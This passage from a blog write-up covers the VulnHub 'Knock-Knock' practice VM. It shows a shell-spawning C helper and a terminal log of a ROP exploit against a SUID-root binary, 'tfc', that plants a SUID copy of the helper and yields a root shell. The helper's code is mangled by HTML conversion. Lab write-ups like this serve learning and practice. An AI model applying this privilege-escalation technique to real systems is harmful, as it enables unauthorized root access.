<p>Unfortunately, if you want to read and write <em>really</em> large files, like <code>/bin/dash</code>, tfc crashes before it can even get to our ROP chain. I solve that with a little helper program:</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span></code></pre></div></p>

<p>OK, so now our moment supreme:</p>

<pre><code class="bash">jason@knockknock:~$ ls -l
total 24
-rw-r--r-- 1 jason jason  109 Oct 16 14:31 getshell.c   
-rwxr-xr-x 1 jason jason 4966 Oct 16 14:31 read         # our little helper program
-rw-r--r-- 1 jason jason 1941 Oct 16 13:29 rop.py       # the rop exploit
-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
jason@knockknock:~$ python rop.py read                  # generate the ROP exploit using 'read'
[!] filesize = 4966
[!] need 10 iterations
jason@knockknock:~$ ls -l
total 32
-rw-r--r-- 1 jason jason  109 Oct 16 14:31 getshell.c
-rw-r--r-- 1 jason jason 4564 Oct 16 14:31 out.tfc      # this is the file we will feed to tfc
-rwxr-xr-x 1 jason jason 4966 Oct 16 14:31 read
-rw-r--r-- 1 jason jason 1941 Oct 16 13:29 rop.py
-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
jason@knockknock:~$ ./tfc out.tfc pwned.tfc             # let's run the ROP exploit
Segmentation fault
jason@knockknock:~$ ls -l
total 40
-rw-r--r-- 1 jason jason  109 Oct 16 14:31 getshell.c
-rw-r--r-- 1 jason jason 4564 Oct 16 14:31 out.tfc
-rw-r--r-- 1 root  jason    0 Oct 16 14:32 pwned.tfc
-rwxr-xr-x 1 jason jason 4966 Oct 16 14:31 read
-rw-r--r-- 1 jason jason 1941 Oct 16 13:29 rop.py
-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
-rwsr-xr-x 1 root  jason 5120 Oct 16 14:32 write        # this is a copy of our helper program, but SETUID!
jason@knockknock:~$ ./write                             # let's give it a spin!
# whoami
root                                                    # YEAHHH!!
</code></pre>

<p>And picture-proof:</p>

<p><img src="/assets/knockknock-rop.png" alt="" /></p>

<p>It worked! The file <code>write</code> is created with SUID set and contains the shell-spawning helper program. Mind you, when I was writing this ROP exploit, I used a local copy of <code>tfc</code> that was not running as root. When the <code>write</code> file was created, it had the SUID bit set, but as soon as something was written to it, the SUID bit was removed. This is security feature (?) is ignored when running as root! Lucky for me ;)</p>

<p>So this is another way to root. I wonder how many more there are! :) Again, thanks zer0w1re and <a href="http://vulnhub.com">VulnHub</a> for hosting this VM! Also cheers to leonjza for proof-reading this post!!</p>
]]></content>
  </entry>
  
</feed>
